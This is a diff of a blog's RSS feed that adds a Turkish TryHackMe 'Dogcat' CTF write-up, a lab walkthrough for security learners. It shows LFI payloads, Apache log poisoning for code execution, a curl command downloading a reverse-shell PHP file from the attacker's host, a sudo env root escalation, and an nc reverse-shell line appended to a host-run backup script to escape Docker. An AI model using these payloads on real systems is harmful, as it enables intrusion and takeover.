@@ -5,8 +5,151 @@
         <description>Recent content in Posts on Cyber Security Blog</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>tr</language>
-        <lastBuildDate>Thu, 08 Oct 2020 12:39:20 +0300</lastBuildDate>
+        <lastBuildDate>Wed, 14 Oct 2020 21:45:22 +0300</lastBuildDate>
         <atom:link href="https://barcode91.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
+        
+        <item>
+            <title>THM Dogcat Write Up</title>
+            <link>https://barcode91.github.io/posts/2020/10/thm-dogcat-write-up/</link>
+            <pubDate>Wed, 14 Oct 2020 21:45:22 +0300</pubDate>
+            
+            <guid>https://barcode91.github.io/posts/2020/10/thm-dogcat-write-up/</guid>
+            <description>Merhaba, Bu yazımda sizlere Tryhackme&amp;rsquo;de yer alan orta seviye zorluktaki DogCat adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&amp;hellip;
+1. Keşif Aşaması Nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.
+sudo nmap -sV -sC 10.10.35.38  Sistemde sadece 2 port açıktır. Web sayfasına giriş yapılır. Anasayfada yer alan dog ve cat butonlarına tıklanarak adres çubuğuna dikkatle bakılır.
+ LFI zafiyeti kontrolü için /etc/passwd dosyası okunmaya çalışılır.
+Dog ve cat dışındaki dosyalar filtreye takılımaktadır.</description>
+            <content type="html"><![CDATA[<p><em>Merhaba, Bu yazımda sizlere Tryhackme&rsquo;de yer alan orta seviye zorluktaki <a href="https://tryhackme.com/room/dogcat">DogCat</a> adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar&hellip;</em></p>
+<h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>
+<p>Nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sV -sC 10.10.35.38
+</code></pre></div>
+    <img src="/images/thm/dogcat/nmap.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Sistemde sadece 2 port açıktır. Web sayfasına giriş yapılır. Anasayfada yer alan dog ve cat butonlarına tıklanarak adres çubuğuna dikkatle bakılır.</p>
+<p>
+    <img src="/images/thm/dogcat/web1.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<br>
+
+    <img src="/images/thm/dogcat/web2.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+</p>
+<p>LFI zafiyeti kontrolü için /etc/passwd dosyası okunmaya çalışılır.</p>
+
+    <img src="/images/thm/dogcat/lfi1.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Dog ve cat dışındaki dosyalar filtreye takılımaktadır. Dog ibaresi eklenerek test tekrarlanır.</p>
+
+    <img src="/images/thm/dogcat/lfi2.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Dog ve cat filtresi baypass edilidiğinde dosyaya otomatik olarak .php uzantısı eklendiği görülmektedir. Php filter kullanılarak index.php dosyası okunmaya çalışılır.</p>
+<pre><code class="language-url" data-lang="url">?view=php://filter/convert.base64-encode/resource=./dog/../index
+</code></pre><p>index.php dosyası başarılı bir şekilde okunur. Sonuç base64 ile decode edilir. Index.php içerisindeki php kodları incelenir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">containsStr</span>($str, $substr) {
+        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">strpos</span>($str, $substr) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>;
+    }
+    $ext <span style="color:#f92672">=</span> <span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#34;ext&#34;</span>]) <span style="color:#f92672">?</span> $_GET[<span style="color:#e6db74">&#34;ext&#34;</span>] <span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;.php&#39;</span>;
+    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;view&#39;</span>])) {
+        <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">containsStr</span>($_GET[<span style="color:#e6db74">&#39;view&#39;</span>], <span style="color:#e6db74">&#39;dog&#39;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">containsStr</span>($_GET[<span style="color:#e6db74">&#39;view&#39;</span>], <span style="color:#e6db74">&#39;cat&#39;</span>)) {
+            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;Here you go!&#39;</span>;
+            <span style="color:#66d9ef">include</span> $_GET[<span style="color:#e6db74">&#39;view&#39;</span>] <span style="color:#f92672">.</span> $ext;
+        } <span style="color:#66d9ef">else</span> {
+            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;Sorry, only dogs or cats are allowed.&#39;</span>;
+        }
+    }
+<span style="color:#75715e">?&gt;</span>
+</code></pre></div><p><strong>containsStr()</strong> metodu ile dog ve cat ifadeleri kontrol edilmektedir. Get isteğinde <strong>ext</strong> parametresi yok ise php uzantısının otomatik olarak eklendiği görülmektedir. İstek yapılırken <strong>&amp;ext</strong> kullanılarak uzantı ekleme kısmı baypass edilir.</p>
+<p><em>LFI zafiyetinden RCE (Remote Code Execution) oluşturabilmek için tarayıcıdan LFI ile okunabilen bir dosyaya php kodu enjekte edilmelidir. Apache logları kontrol edilir. Özellikle access.log dosyasında web servisine atılan tüm isteklerin header bilgileri kayıt edilmektedir. Log dosyası okunmaya çalışılır.</em></p>
+<pre><code class="language-url" data-lang="url">?view=./dog/../../../../var/log/apache2/access.log&amp;ext=
+</code></pre>
+    <img src="/images/thm/dogcat/logpage.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Log içeriklerine bakıldığında <em><strong>User-Agent</strong></em> bilgisininde kayıt edildiği görülmektedir. User-Agent bilgisi kod çalıştırabilecek bir php kodu ile değiştirilip istek atıldığında isteğin başlık bilgisi, log dosyasına kayıt edilir. İşlem Burpsuite aracı kullanılarak yapılır.</p>
+
+    <img src="/images/thm/dogcat/user.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Daha sonra test için cmd parametresine id değeri verilerek apache access log dosyası okunmaya çalışılır.</p>
+<pre><code class="language-url" data-lang="url">?view=./dog/../../../../var/log/apache2/access.log&amp;ext=&amp;cmd=id
+</code></pre>
+    <img src="/images/thm/dogcat/id.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>id komutu başarılı ile çalışmaktadır. Bu aşamadan sonra shell bağlantısı için birçok yol izlenebilir. Biz burada sisteme dosya upload ederek shell bağlantısı alacağız.</p>
+<p>Localhostta python3 http.server modulü kullanılarak web sunucusu ayağa kaldırılır. Daha sonra</p>
+<pre><code>&amp;cmd=curl http://10.9.62.67:8000/reverse.php -o reverse.php 
+</code></pre><p>komutu adres çubuğuna eklenir.</p>
+<pre><code class="language-url" data-lang="url">?view=./dog/../../../../var/log/apache2/access.log&amp;ext=&amp;&amp;cmd=curl http://10.9.62.67:8000/reverse.php -o reverse.php
+</code></pre>
+    <img src="/images/thm/dogcat/server.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<h2 id="2-erişim-sağlanması">2. Erişim Sağlanması</h2>
+<p>Ayarlanan port dinlemeye başlanır. Daha sonra tarayıcıdan yüklenen dosyaya istek atılır ve shell bağlantısı sağlanır.</p>
+<p><code>http://10.10.35.38/reverse.php</code></p>
+
+    <img src="/images/thm/dogcat/shell.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Web dizine bakıldığında birinci flag dosyası okunur.</p>
+
+    <img src="/images/thm/dogcat/flag1.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<h2 id="3-yetki-yükseltme">3. Yetki Yükseltme</h2>
+<p><code>sudo -l</code> komutu ile <em>www-data</em> kullanısının yetkileri kontrol edilir. <strong>env</strong> komutunun parola gerektirmeden root yetkisi ile çalıştırılabileceği tespit edilir.</p>
+
+    <img src="/images/thm/dogcat/priv.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Aşağıdaki komut ile <em><strong>env</strong></em> uygulaması ile yetki yükseltilir.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo /usr/bin/env /bin/bash 
+</code></pre></div>
+    <img src="/images/thm/dogcat/root1.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p><strong>find</strong> komutu ile sistemdeki diğer flag dosyaları aranır. flag2 ve flag3 dosyaları tespit edilir. Root yetkisinde olduğumuzdan flaglar kolayca okunur.</p>
+
+    <img src="/images/thm/dogcat/flags.png"  alt="Hello Friend"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Makinadaki toplam 4 adet flag dosyasından 3 tanesi tespit edilmiştir.</p>
+
+    <img src="/images/thm/dogcat/makina.png"  alt="Hello Friend"  class="center"  />
+
+
+<p>Makina adına dikkatlice bakıldığında docker container içerisinde olduğumuz görülmektedir. Diğer flag dosyası için container dışına çıkmamız gerekmektedir.</p>
+<p><strong>/opt</strong> dizini kontrol edildiğinde backups klasörü dikkat çekmektedir. Dizin içeriğine bakıldığında backup.sh adında shell script bulunmaktadır.</p>
+
+    <img src="/images/thm/dogcat/backup.png"  alt="Hello Friend"  class="center"  style="border-radius: 5px;"  />
+
+
+<p><em>/root/container</em> dizini ile container içerisinde yer alan <em>/opt/backup</em> dizininin volume oluşturularak bağlandığı görülmektedir. Dizindeki backup.sh dosyasına shell kodu eklenerek containerdan dışarı çıkılır.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo <span style="color:#e6db74">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.9.62.67 5555 &gt;/tmp/f&#34;</span> &gt;&gt; backup.sh
+</code></pre></div><p>nc ile 5555 port dinlenir. backup.sh dosyası containerın çalıştığı host tarafından düzenli olarak çalıştırılmaktadır. (Öyle tahmin ederek bağlantı gelmesi beklenir 🤫)</p>
+
+    <img src="/images/thm/dogcat/root2.png"  alt="Hello Friend"  class="center"  style="border-radius: 5px;"  />
+
+
+<p>Kısa bir süre sonra ana makinadan shell bağlantısı alınır. Root dizini kontrol edilerek 4. flag dosyası okunur.</p>
+<p>
+    <img src="/images/thm/dogcat/rootdir.png"  alt="Hello Friend"  class="center"  style="border-radius: 5px;"  />
+
+
+<br>
+
+    <img src="/images/thm/dogcat/rootflagg.png"  alt="Hello Friend"  class="center"  style="border-radius: 5px;"  />
+
+</p>
+]]></content>
+        </item>
         
         <item>
             <title>THM Wonderland Write Up</title>
